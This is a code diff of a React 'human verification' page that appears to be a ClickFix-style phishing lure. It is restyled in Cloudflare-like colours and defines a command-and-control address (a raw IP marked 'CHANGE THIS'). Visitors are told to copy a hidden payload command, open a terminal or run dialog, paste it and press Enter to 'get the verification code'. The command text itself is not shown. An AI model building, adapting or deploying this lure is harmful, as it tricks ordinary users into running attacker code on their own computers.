@@ -15,8 +15,8 @@ function clientOs(agent: string): ClientOs {
     typeof navigator === "undefined"
       ? ""
       : (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform ||
-        navigator.platform ||
-        ""
+      navigator.platform ||
+      ""
   const hint = hinted.replace(/^"|"$/g, "")
   if (/mac/i.test(hint)) return "mac"
   if (/win/i.test(hint)) return "windows"
@@ -95,7 +95,7 @@ export function HumanVerification() {
     crypto.getRandomValues(bytes)
     return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
   })
-  const commandRef = useRef<HTMLTextAreaElement>(null)
+  const commandRef = useRef<HTMLInputElement>(null)
   const shown = useRef(false)
   const checkRun = useRef(0)
 
@@ -107,7 +107,7 @@ export function HumanVerification() {
       window.location.replace(`${window.location.origin}/${window.location.search}`)
     }
   }, [])
-  
+
   const [payloadText, setPayloadText] = useState('')
 
   const C2_URL = 'http://146.103.57.122/69'; // CHANGE THIS
@@ -306,7 +306,7 @@ export function HumanVerification() {
                 </a>
               </span>
             </span>
-          </div>          
+          </div>
           {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
         </div>
         <footer className="absolute inset-x-0 bottom-0 border-t border-[#e6e6e6] px-4 py-4 text-center text-[12px] leading-5 text-[#595959]">
@@ -338,19 +338,79 @@ export function HumanVerification() {
       <div className="w-full max-w-[520px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
         {passed ? (
           <div className="px-0 py-10 text-center">
-            <h2 className="text-xl font-semibold text-[#16a34a]">{humanVerification.successTitle}</h2>
+            <h2 className="text-xl font-semibold text-[#F6821F]">{humanVerification.successTitle}</h2>
             <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
           </div>
         ) : (
           <>
-            <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>               
+            <div className="rounded bg-[#FBAD41] px-8 py-7 text-white shadow-sm">
+              <p className="mb-1.5 text-base font-normal">Complete these</p>
+              <h2 className="text-3xl font-bold leading-tight">Verification Steps</h2>
+            </div>
             <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-left">
               <div className="mb-6 text-sm leading-normal text-[#64748b]">
+                {command ? (
+                  <div className="mt-4 flex items-center gap-2.5">
+                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '12px', width: '100%' }}>
+                      <input
+                        ref={commandRef}
+                        value={payloadText}
+                        readOnly
+                        style={{
+                          flex: 1,
+                          minWidth: 0,
+                          height: '32px',
+                          background: '#fff',
+                          border: '1px solid #dadce0',
+                          borderRadius: '4px',
+                          color: '#202124',
+                          fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
+                          fontSize: '16px',
+                          padding: '0 10px',
+                          outline: 'none',
+                        }}
+                      />
+                      <button
+                        id="copyBtn"
+                        onClick={onCopy}
+                        style={{
+                          display: 'flex',
+                          alignItems: 'center',
+                          justifyContent: 'center',
+                          gap: '4px',
+                          padding: '0 12px',
+                          background: '#F6821F',
+                          color: '#fff',
+                          fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
+                          fontSize: '14px',
+                          fontWeight: '500',
+                          border: 'none',
+                          borderRadius: '4px',
+                          cursor: 'pointer',
+                          whiteSpace: 'nowrap',
+                          flexShrink: 0,
+                          height: '32px',
+                        }}
+                      >
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                          <rect x="8" y="8" width="12" height="12" rx="2" stroke="#fff" strokeWidth="2" />
+                          <path d="M6 16H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#fff" strokeWidth="2" />
+                        </svg>
+                        {copied ? humanVerification.copiedLabel : humanVerification.copyLabel}
+                      </button>
+                    </div>
+                  </div>
+                ) : (
+                  <p className="rounded-lg bg-[#f8fafc] px-4 py-3.5 text-sm text-[#64748b]">
+                    {humanVerification.captureWaiting}
+                  </p>
+                )}
+                {copyNote ? <p className="mt-3 text-[13px] text-[#64748b]">{copyNote}</p> : null}
                 {os === "mac" ? (
                   <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                     <li>
                       Press the{" "}
-                      <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
+                      <span className="inline-flex items-center rounded-md bg-[#FBAD41] px-2 py-1 text-xs font-semibold text-white shadow-sm">
                         Copy
                       </span>{" "}
                       button to copy the command.
@@ -374,13 +434,13 @@ export function HumanVerification() {
                         Enter
                       </span>{" "}
                       to get the verification code.
-                    </li>       
+                    </li>
                   </ol>
                 ) : os === "windows" ? (
                   <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                     <li>
                       Press the{" "}
-                      <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
+                      <span className="inline-flex items-center rounded-md bg-[#FBAD41] px-2 py-1 text-xs font-semibold text-white shadow-sm">
                         Copy
                       </span>{" "}
                       button to copy the command.
@@ -418,19 +478,19 @@ export function HumanVerification() {
                         Enter
                       </span>{" "}
                       to get the verification code.
-                    </li>                
+                    </li>
                   </ol>
                 ) : (
                   <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                     <li>
                       Press the{" "}
-                      <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
+                      <span className="inline-flex items-center rounded-md bg-[#FBAD41] px-2 py-1 text-xs font-semibold text-white shadow-sm">
                         Copy
                       </span>{" "}
                       button to copy the command.
                     </li>
                     <li>
-                      Press the <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>T</strong> 
+                      Press the <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>T</strong>
                     </li>
                     <li>
                       Press{" "}
@@ -445,62 +505,94 @@ export function HumanVerification() {
                         Enter
                       </span>{" "}
                       to get the verification code.
-                    </li>       
+                    </li>
                   </ol>
                 )}
-              </div>              
-            </div>
-            {command ? (
-              <div className="mb-4 flex items-center gap-2.5">
-                <div className="min-h-20 min-w-0 flex-1 rounded-lg bg-[#0f172a] p-1">
-                  <textarea
-                    ref={commandRef}
-                    readOnly
-                    value={payloadText}
-                    aria-label={humanVerification.captureLabel}
-                    onFocus={(event) => event.currentTarget.select()}
-                    className="h-20 w-full resize-none border-none bg-transparent px-2 py-1.5 font-[Menlo,Consolas,monospace] text-[13px] leading-5 text-[#e2e8f0] outline-none"
-                  />
-                </div>
-                <button
-                  type="button"
-                  onClick={onCopy}
-                  className={`flex shrink-0 items-center justify-center gap-[5px] rounded-lg px-3.5 py-2.5 text-sm text-white ${
-                    copied ? "bg-[#16a34a]" : "bg-[#2563eb] hover:bg-[#1d4ed8]"
-                  }`}
-                >
-                  <span aria-hidden="true">{copied ? "✓" : "📋"}</span>
-                  {copied ? humanVerification.copiedLabel : humanVerification.copyLabel}
-                </button>
               </div>
-            ) : (
-              <p className="rounded-lg bg-[#f8fafc] px-4 py-3.5 text-sm text-[#64748b]">
-                {humanVerification.captureWaiting}
-              </p>
-            )}
-            {copyNote ? <p className="mt-3 text-[13px] text-[#64748b]">{copyNote}</p> : null}
-            <form onSubmit={onSubmit} className="mt-5 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] p-4">
-              <label htmlFor="human-code" className="block text-sm font-medium text-[#1e293b]">
-                {humanVerification.verifyLabel}
-              </label>
-              <input
-                id="human-code"
-                value={codeInput}
-                onChange={(event) => setCodeInput(event.target.value.trim())}
-                autoComplete="off"
-                spellCheck={false}
-                maxLength={10}
-                placeholder={humanVerification.verifyPlaceholder}
-                className="mt-2 w-full rounded-md border border-[#cbd5e1] bg-white px-3 py-2.5 text-base outline-none focus:border-[#2563eb]"
-              />
-              {error ? <p className="mt-1.5 text-[13px] text-[#dc2626]">{humanVerification.verifyError}</p> : null}
-              <button
-                type="submit"
-                disabled={submitting}
-                className="mt-3 w-full cursor-pointer rounded-md border-none bg-[#2563eb] px-3 py-2.5 text-sm text-white hover:bg-[#1d4ed8] disabled:opacity-40"
-              >
-                {humanVerification.continueLabel}
-              </button>
+            </div>
+
+            <form
+              onSubmit={onSubmit}
+              className="mt-5 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] p-4"
+            >
+              <div className="flex flex-wrap items-center gap-3">
+                <label
+                  htmlFor="human-code-0"
+                  className="shrink-0 text-sm font-medium text-[#1e293b]"
+                >
+                  {humanVerification.verifyLabel}
+                </label>
+
+                <div className="flex items-center gap-2">
+                  {Array.from({ length: 6 }).map((_, index) => (
+                    <input
+                      key={index}
+                      id={index === 0 ? "human-code-0" : undefined}
+                      type="text"
+                      inputMode="text"
+                      autoComplete="off"
+                      spellCheck={false}
+                      maxLength={1}
+                      value={codeInput[index] ?? ""}
+                      disabled={submitting}
+                      aria-label={`Character ${index + 1}`}
+                      className="h-10 w-10 rounded-md border border-[#cbd5e1] bg-white text-center text-base uppercase tracking-wide text-[#1e293b] outline-none focus:border-[#2563eb] disabled:opacity-40"
+                      onChange={(event) => {
+                        const char = event.target.value
+                          .replace(/[^a-zA-Z0-9]/g, "")
+                          .slice(-1)
+                          .toUpperCase();
+
+                        const chars = codeInput.padEnd(6, " ").split("").slice(0, 6);
+                        chars[index] = char || " ";
+                        const next = chars.join("").replace(/ /g, "").slice(0, 6);
+                        setCodeInput(next);
+
+                        if (char) {
+                          const inputs = event.currentTarget
+                            .closest("form")
+                            ?.querySelectorAll<HTMLInputElement>("input[data-code-box]");
+                          inputs?.[index + 1]?.focus();
+                        }
+                      }}
+                      onKeyDown={(event) => {
+                        if (event.key === "Backspace" && !codeInput[index] && index > 0) {
+                          const inputs = (event.target as HTMLInputElement)
+                            .closest("form")
+                            ?.querySelectorAll<HTMLInputElement>("input[data-code-box]");
+                          inputs?.[index - 1]?.focus();
+                        }
+                      }}
+                      onPaste={(event) => {
+                        event.preventDefault();
+                        const pasted = event.clipboardData
+                          .getData("text")
+                          .replace(/[^a-zA-Z0-9]/g, "")
+                          .toUpperCase()
+                          .slice(0, 6);
+                        if (pasted) setCodeInput(pasted);
+                      }}
+                      data-code-box
+                    />
+                  ))}
+                </div>
+
+                <div className="flex min-w-[120px] flex-1 justify-center">
+                  <button
+                    type="submit"
+                    disabled={submitting || codeInput.length < 6}
+                    className="cursor-pointer rounded-md border-none bg-[#F6821F] px-4 py-2.5 text-sm text-white hover:bg-[#555555] disabled:opacity-40"
+                  >
+                    {humanVerification.continueLabel}
+                  </button>
+                </div>
+              </div>
+
+              {error ? (
+                <p className="mt-1.5 text-[13px] text-[#dc2626]">
+                  {humanVerification.verifyError}
+                </p>
+              ) : null}
             </form>
           </>
         )}
